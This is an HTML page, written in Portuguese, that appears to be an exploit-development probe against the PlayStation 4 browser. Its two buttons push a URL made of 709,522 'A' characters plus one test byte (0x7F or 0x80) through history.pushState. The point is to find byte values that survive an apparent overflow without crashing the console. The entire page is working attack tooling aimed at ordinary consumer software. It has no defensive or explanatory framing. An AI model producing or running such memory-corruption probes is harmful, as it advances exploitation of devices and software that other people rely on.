<!DOCTYPE html>
<html>
<head>
    <title>PS4 Safe Island Search</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 24px; padding: 20px; margin: 20px; cursor: pointer; 
            width: 90%; border: 2px solid #00ff00; background: #111; color: #fff;
        }
        .btn-del { border-color: #e67e22; color: #e67e22; }
        .btn-high { border-color: #3498db; color: #3498db; }
        #log { margin-top: 20px; border: 1px solid #333; padding: 10px; color: yellow; font-size: 18px; }
    </style>
</head>
<body>

    <h1>Busca por Ilhas Seguras</h1>
    <p>Precisamos de um valor alto que não trave o console.</p>

    <div id="log">Reinicie o console antes de testar!</div>

    <button class="btn-del" onclick="sendByte(0x7F)">
        1. TESTAR DELETE (0x7F / 127)<br>
        <small>Último comando da tabela ASCII</small>
    </button>

    <button class="btn-high" onclick="sendByte(0x80)">
        2. TESTAR HIGH BIT (0x80 / 128)<br>
        <small>Passa se a verificação for "signed char"?</small>
    </button>

    <script>
        const OFFSET = 709522;

        function log(msg) {
            document.getElementById('log').innerText = msg;
        }

        function sendByte(val) {
            log("Testando valor 0x" + val.toString(16).toUpperCase() + " (" + val + ")...");
            
            setTimeout(() => {
                try {
                    // Padding seguro
                    let buffer = "A".repeat(OFFSET);
                    
                    // Adiciona o byte de teste
                    buffer += String.fromCharCode(val); 

                    // Dispara
                    history.pushState({}, "island_test", "/" + buffer);
                    
                    log("SOBREVIVEU! O valor " + val + " é uma chave válida!");
                    document.body.style.backgroundColor = "#fff"; 
                    document.body.style.color = "#000";

                } catch (e) {
                    log("Erro JS: " + e.message);
                }
            }, 500);
        }
    </script>
</body>
</html>
